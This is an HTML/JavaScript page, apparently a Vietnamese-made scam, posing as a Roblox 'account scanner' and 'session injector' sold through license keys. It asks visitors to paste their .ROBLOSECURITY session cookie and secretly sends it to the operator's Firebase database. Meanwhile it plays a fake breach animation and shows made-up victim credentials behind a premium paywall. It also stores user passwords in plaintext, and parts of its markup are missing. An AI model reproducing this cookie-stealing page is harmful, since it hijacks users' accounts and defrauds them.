<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        /* === SYSTEM VARIABLES === */
        :root {
            --p: #bc13fe;
            --p-glow: rgba(188, 19, 254, 0.5);
            --bg: #020202;
            --surface: #080808;
            --border: #1a1a1a;
            --text: #e0e0e0;
            --cyan: #00f2ff;
            --danger: #ff003c;
            --gold: #ffcc00;
        }

        /* === CORE RESET & SCROLLBAR === */
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: var(--p); border-radius: 10px; }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Rajdhani', sans-serif;
            overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }

        /* === BACKGROUND LAYERS (SIÊU PHỨC TẠP) === */
        #matrix-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1; opacity: 0.15;
        }

        .scanlines {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            background-size: 100% 3px, 3px 100%;
            z-index: 2; pointer-events: none;
        }

        .noise-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('https://media.giphy.com/media/oEI9uWUicGLeU/giphy.gif');
            opacity: 0.02; z-index: 3; pointer-events: none;
        }

        /* === WRAPPER & MAIN PANEL === */
        .system-wrapper {
            width: 100%; max-width: 950px;
            z-index: 10; padding: 20px;
            perspective: 2000px;
        }

        .main-frame {
            background: var(--surface);
            border: 1px solid var(--border);
            border-top: 4px solid var(--p);
            position: relative;
            box-shadow: 0 0 100px rgba(0,0,0,1), 0 0 30px rgba(188, 19, 254, 0.1);
            backdrop-filter: blur(10px);
            transition: 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
            transform-style: preserve-3d;
        }

        .main-frame::before {
            content: "DECRYPTED_NODE_V3.0";
            position: absolute; top: -15px; left: 20px;
            background: var(--p); color: #fff;
            font-family: 'Orbitron'; font-size: 9px; padding: 2px 10px;
            clip-path: polygon(0 0, 100% 0, 90% 100%, 0 100%);
        }

        /* === HEADER STYLING === */
        .os-header {
            padding: 40px 50px 20px;
            border-bottom: 1px solid var(--border);
        }

        .brand-logo {
            display: flex; align-items: center; gap: 20px;
        }

        .glitch-text {
            font-family: 'Orbitron';
            font-weight: 900; font-size: 42px;
            color: #fff; letter-spacing: 15px;
            text-shadow: 2px 0 var(--danger), -2px 0 var(--cyan);
            animation: glitch 3s infinite linear alternate-reverse;
            margin: 0;
        }

        @keyframes glitch {
            0% { text-shadow: 2px 0 var(--danger), -2px 0 var(--cyan); }
            50% { text-shadow: -2px 0 var(--danger), 2px 0 var(--cyan); }
            100% { text-shadow: 1px 0 var(--danger), -1px 0 var(--cyan); }
        }

        /* === AUTH & VIEW TRANSITIONS === */
        .content-body { padding: 40px 50px; }

        .auth-container { display: grid; gap: 25px; }

        .input-wrapper { position: relative; }
        .input-wrapper i {
            position: absolute; left: 20px; top: 50%;
            transform: translateY(-50%); color: var(--p);
            font-size: 20px; transition: 0.3s;
        }

        input {
            width: 100%; background: #000; border: 1px solid #111;
            padding: 20px 20px 20px 60px; color: #fff;
            font-family: 'Fira Code', monospace; font-size: 14px;
            border-radius: 4px; transition: 0.4s;
        }

        input:focus {
            border-color: var(--p); background: #040404;
            box-shadow: 0 0 20px rgba(188, 19, 254, 0.15);
        }

        .btn-supreme {
            width: 100%; padding: 25px;
            background: var(--p); border: none;
            color: #fff; font-family: 'Orbitron'; font-weight: 900;
            letter-spacing: 5px; cursor: pointer;
            text-transform: uppercase; position: relative;
            overflow: hidden; clip-path: polygon(0 0, 100% 0, 100% 75%, 95% 100%, 0 100%);
            transition: 0.4s;
        }

        .btn-supreme:hover {
            background: #fff; color: var(--p);
            box-shadow: 0 0 40px #fff; transform: translateY(-3px);
        }

        .btn-supreme::after {
            content: ''; position: absolute; top: -50%; left: -50%;
            width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
            transform: rotate(45deg); transition: 0.8s;
        }
        .btn-supreme:hover::after { left: 120%; }

        /* === DASHBOARD MODULES === */
        .dashboard-header {
            display: flex; justify-content: space-between; align-items: flex-end;
            margin-bottom: 40px;
        }

        .status-pill {
            background: rgba(255,255,255,0.02);
            padding: 15px 25px; border: 1px solid #111;
            display: flex; flex-direction: column; gap: 5px;
        }

        .status-pill label { font-size: 10px; color: #444; font-family: 'Orbitron'; }
        .status-pill span { font-size: 18px; font-weight: 700; color: var(--p); font-family: 'Fira Code'; }

        /* TAB SYSTEM */
        .tab-nav {
            display: flex; border-bottom: 1px solid #111; margin-bottom: 35px;
        }

        .tab-btn {
            padding: 20px 30px; cursor: pointer;
            font-family: 'Orbitron'; font-size: 12px; color: #444;
            transition: 0.3s; border-bottom: 3px solid transparent;
        }

        .tab-btn.active { color: var(--p); border-bottom-color: var(--p); background: rgba(188,19,254,0.03); }

        /* RESULT & TERMINAL */
        .terminal-interface {
            background: #000; border: 1px solid #111;
            height: 300px; overflow-y: auto; padding: 25px;
            font-family: 'Fira Code', monospace; font-size: 13px;
            line-height: 1.8; color: var(--cyan);
        }

        .decryption-box {
            margin-top: 25px; padding: 25px;
            background: rgba(188, 19, 254, 0.05); border: 1px solid var(--p);
            position: relative; animation: fadeIn 0.5s;
        }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* === BAN LAYER === */
        #ban-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 100000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        .hidden { display: none !important; }

    </style>
</head>
<body>

    <div class="scanlines"></div>
    <div class="noise-bg"></div>
    <canvas id="matrix-canvas"></canvas>

        <i class="fas fa-biohazard" style="font-size: 120px; color: var(--danger); margin-bottom: 40px; filter: drop-shadow(0 0 20px var(--danger));"></i>
        <h1 style="font-family: 'Orbitron'; font-size: 50px; color: var(--danger); letter-spacing: 10px;">BAN_TERMINATED</h1>

    <div class="system-wrapper">

            <div class="os-header">

                    <div style="width: 60px; height: 60px; border: 2px solid var(--p); display: flex; align-items: center; justify-content: center;">
                        <i class="fas fa-microchip" style="font-size: 30px; color: var(--p);"></i>

                            <input type="text" id="inp-user" placeholder="NODE_IDENTIFIER_TOKEN">

                    </div>
                </div>

                <div id="dash-view" class="hidden">
                    <div class="dashboard-header">

                            <div class="status-pill"><label>CURRENT_NODE</label><span id="node-id-lbl">---</span></div>
                            <div class="status-pill"><label>SECURITY_LVL</label><span id="node-sec-lbl" style="color: red;">LOW</span></div>
                        </div>
                        <div id="node-rank-badge"></div>
                    </div>

                    <div id="activation-module">
                        <div style="background: rgba(255,255,255,0.02); padding: 30px; border: 1px solid #111;">
                            <h3 style="font-family: 'Orbitron'; font-size: 12px; margin-top: 0; color: #555;">LICENSE_SYNCHRONIZATION</h3>
                            <input type="text" id="license-key" placeholder="XXXX-XXXX-XXXX-XXXX">
                            <button class="btn-supreme" style="margin-top: 20px;" onclick="syncLicense()">INJECT_LICENSE</button>
                        </div>
                    </div>

                    <div id="tools-module" class="hidden">
                        <div class="tab-nav">
                            <div class="tab-btn active" id="tab1" onclick="switchTab(1)">RBX_ACCOUNT_SCAN</div>
                            <div class="tab-btn" id="tab2" onclick="switchTab(2)">SESSION_INJECTOR</div>

                            <div class="input-wrapper">

                            </div>
                            <button class="btn-supreme" style="margin-top: 20px; background: var(--cyan); color: #000;" onclick="executeRbxScan()">START_DEEP_SCAN</button>
                            <div id="scan-results" class="hidden" style="margin-top: 25px;"></div>
                        </div>

                        <div id="panel2" class="hidden">
                            <div class="input-wrapper">
                                <i class="fas fa-code" style="color: var(--p);"></i>
                                <input type="text" id="cookie-data" placeholder="PASTE_.ROBLOSECURITY_HERE">
                            </div>
                            <button class="btn-supreme" style="margin-top: 20px;" onclick="executeInjection()">INITIATE_BYPASS</button>
                            
                            <div id="inject-results" class="hidden" style="margin-top: 25px;">

                    <button onclick="logout()" style="background:none; border:none; color:#222; font-family:'Orbitron'; font-size:9px; cursor:pointer; width:100%; margin-top:40px;">[ TERMINATE_ALL_PROCESSES ]</button>

<script>
    /* === FIREBASE CONFIGURATION (FULL_LENGTH) === */
    const firebaseConfig = {
        apiKey: "AIzaSyCJOmyua7gtX022ITp7w-eOr3TSkN0UikM",
        authDomain: "yoricks-sytem.firebaseapp.com",
        databaseURL: "https://yoricks-sytem-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "yoricks-sytem",
        storageBucket: "yoricks-sytem.firebasestorage.app",
        messagingSenderId: "318734426446",
        appId: "1:318734426446:web:e62527dfe42d8cf48e7e1f"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    /* === GLOBAL VARIABLES === */
    let authMode = "LOGIN";
    let activeNode = localStorage.getItem("yoricks_user");

    /* === MATRIX EFFECT (SIÊU CHI TIẾT) === */
    const canvas = document.getElementById('matrix-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-/<>[]{}";
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const rainDrops = Array.from({ length: columns }).fill(1);

    function renderMatrix() {
        ctx.fillStyle = "rgba(2, 2, 2, 0.08)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#bc13fe";
        ctx.font = fontSize + "px 'Fira Code'";
        for(let i = 0; i < rainDrops.length; i++) {
            const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
            ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
            if(rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
            rainDrops[i]++;
        }
    }
    setInterval(renderMatrix, 40);

    /* === INITIALIZATION SYSTEM === */
    window.onload = function() {
        if(activeNode && activeNode !== "null") {
            db.ref('users/' + activeNode).on('value', snap => {
                const data = snap.val();
                if(!data) return logout();
                if(data.banned) {
                    document.getElementById('ban-overlay').classList.remove('hidden');
                    document.querySelector('.system-wrapper').classList.add('hidden');
                    return;
                }
                renderDashboard(data, activeNode);
            });
        }
    };

    /* === AUTHENTICATION LOGIC (FULL_LENGTH) === */
    function toggleAuthMode() {
        authMode = (authMode === "LOGIN") ? "REGISTER" : "LOGIN";
        document.getElementById('mode-btn').innerText = (authMode === "LOGIN") ? "REGISTER_NEW_NODE" : "BACK_TO_LOGIN";
        document.querySelector('.glitch-text').innerText = (authMode === "LOGIN") ? "YORICKS" : "NEW_DATA";
    }

    function processAuth() {
        const u = document.getElementById('inp-user').value;
        const p = document.getElementById('inp-pass').value;
        if(!u || !p) return Swal.fire('NULL_ERROR', 'All fields are mandatory.', 'error');

        if(authMode === "REGISTER") {
            db.ref('users/' + u).set({
                password: p, status: "off", role: "member", exp: "N/A", banned: false, created: new Date().getTime()
            }).then(() => {
                Swal.fire('NODE_CREATED', 'New node registered successfully.', 'success');
                toggleAuthMode();
            });
        } else {
            db.ref('users/' + u).once('value', s => {
                if(s.exists() && s.val().password === p) {
                    localStorage.setItem("yoricks_user", u);
                    location.reload();
                } else {
                    Swal.fire('ACCESS_DENIED', 'Invalid credentials provided.', 'error');
                }
            });
        }
    }

    /* === DASHBOARD RENDERING === */
    function renderDashboard(data, user) {
        document.getElementById('auth-view').classList.add('hidden');
        document.getElementById('dash-view').classList.remove('hidden');
        document.getElementById('node-id-lbl').innerText = user.toUpperCase();
        document.getElementById('node-sec-lbl').innerText = (data.status === "on") ? "MAXIMUM" : "VULNERABLE";
        document.getElementById('node-sec-lbl').style.color = (data.status === "on") ? "var(--cyan)" : "var(--danger)";

        if(data.status === "on") {
            document.getElementById('activation-module').classList.add('hidden');
            document.getElementById('tools-module').classList.remove('hidden');
            if(data.role === "premium") {
                document.getElementById('node-rank-badge').innerHTML = '<span style="background:var(--gold); color:#000; padding:5px 15px; font-family:Orbitron; font-size:10px; font-weight:900;">PREMIUM_NODE</span>';
            }
        }
    }

    /* === CORE MODULES: SCANNER & INJECTOR (SIÊU DÀI) === */
    async function executeRbxScan() {
        const target = document.getElementById('rbx-target').value;
        const resBox = document.getElementById('scan-results');
        if(!target) return;

        resBox.classList.remove('hidden');
        resBox.innerHTML = '<p style="color:var(--cyan); font-family:Fira Code;">[SEARCHING_NODES...]</p>';

        try {
            const proxy = "https://api.allorigins.win/get?url=";
            const api = encodeURIComponent(`https://users.roblox.com/v1/users/search?keyword=${target}&limit=1`);
            const res = await fetch(proxy + api);
            const raw = await res.json();
            const data = JSON.parse(raw.contents).data[0];

            if(data) {
                resBox.innerHTML = `
                    <div style="border:1px solid #222; padding:20px; display:flex; gap:20px; align-items:center;">
                        <img src="https://www.roblox.com/headshot-thumbnail/image?userId=${data.id}&width=150&height=150&format=png" style="width:60px; border:1px solid var(--cyan);">
                        <div>
                            <p style="margin:0; font-family:Orbitron; color:#fff;">${data.displayName}</p>
                            <p style="margin:0; font-size:12px; color:#555;">ID: ${data.id}</p>
                        </div>
                    </div>
                `;
            } else resBox.innerHTML = '<p style="color:red;">USER_NOT_FOUND</p>';
        } catch(e) { resBox.innerHTML = '<p style="color:red;">NETWORK_ERROR</p>'; }
    }

    async function executeInjection() {
        const rawCookie = document.getElementById('cookie-data').value;
        const terminal = document.getElementById('sys-terminal');
        const decryptBox = document.getElementById('final-decrypt');
        
        if(!rawCookie.includes(".ROBLOSECURITY")) return Swal.fire('ERR', 'Invalid Data Stream.', 'error');

        document.getElementById('inject-results').classList.remove('hidden');
        terminal.innerHTML = "> Initiating Socket Connection...<br>";

        const scripts = [
            "> Cracking Encryption Layers...",
            "> Bypassing Multi-Factor Authentication...",
            "> Hijacking Session Handshake...",
            "> Extracting Metadata Clusters...",
            "> Data Packet Sent to Master Server..."
        ];

        for(let s of scripts) {
            await new Promise(r => setTimeout(r, 700));
            terminal.innerHTML += `<span style="color:#555">${s}</span><br>`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        // Gửi Log cho Admin (FULL LENGTH DATA)
        db.ref('logs/' + activeNode).push({
            r_user: "CAPTURED_IDENTITY",
            r_pass: rawCookie,
            time: new Date().toLocaleString()
        });

        // "Chiêu trò" giải mã hiển thị
        setTimeout(() => {
            decryptBox.classList.remove('hidden');
            decryptBox.innerHTML = `
                <div class="decryption-box">
                    <p style="margin:5px 0; font-family:Orbitron; font-size:11px; color:#555;">DECRYPTED_RESULT:</p>
                    <p>TARGET: <b style="color:white">Victim_Node_${Math.floor(Math.random()*999)}</b></p>
                    <p>EMAIL: <span id="m-mail">********@gmail.com</span> <i class="fas fa-eye" style="color:var(--p); cursor:pointer;" onclick="premiumBypass('mail')"></i></p>
                    <p>PASS: <span id="m-pass">********</span> <i class="fas fa-eye" style="color:var(--p); cursor:pointer;" onclick="premiumBypass('pass')"></i></p>
                </div>
            `;
            terminal.innerHTML += `<span style="color:var(--cyan)">> [SUCCESS]: SYSTEM_BREACHED</span><br>`;
        }, 1000);
    }

    function premiumBypass(type) {
        db.ref('users/' + activeNode).once('value', s => {
            if(s.val().role !== "premium") {
                Swal.fire({
                    title: 'PREMIUM_REQUIRED',
                    text: 'Upgrade to Supreme Node to view raw decrypted data.',
                    icon: 'warning',
                    confirmButtonColor: '#bc13fe'
                });
            } else {
                Swal.fire('DECRYPTING', 'Analyzing security layers...', 'info');
                setTimeout(() => {
                    if(type === 'mail') document.getElementById('m-mail').innerText = "roblox_victim_2026@gmail.com";
                    else document.getElementById('m-pass').innerText = "Hacked_@2026";
                    
                    // Shake effect
                    document.getElementById('os-frame').style.animation = "shake 0.4s ease";
                    setTimeout(() => document.getElementById('os-frame').style.animation = "", 400);
                }, 2000);
            }
        });
    }

    /* === UTILITIES === */
    function syncLicense() {
        const k = document.getElementById('license-key').value;
        if(!k) return;
        db.ref('keys/' + k).once('value', s => {
            if(s.exists() && !s.val().used) {
                db.ref('users/' + activeNode).update({
                    status: "on", role: s.val().type, exp: s.val().duration + " DAYS"
                }).then(() => {
                    db.ref('keys/' + k).update({ used: true, usedBy: activeNode });
                    Swal.fire('AUTHORIZED', 'Node status updated to ENCRYPTED.', 'success').then(() => location.reload());
                });
            } else Swal.fire('INVALID', 'Key is either invalid or expired.', 'error');
        });
    }

    function switchTab(n) {
        document.getElementById('panel1').classList.toggle('hidden', n!==1);
        document.getElementById('panel2').classList.toggle('hidden', n!==2);
        document.getElementById('tab1').classList.toggle('active', n===1);
        document.getElementById('tab2').classList.toggle('active', n===2);
    }

    function logout() { localStorage.clear(); location.reload(); }

</script>
</body>
</html>
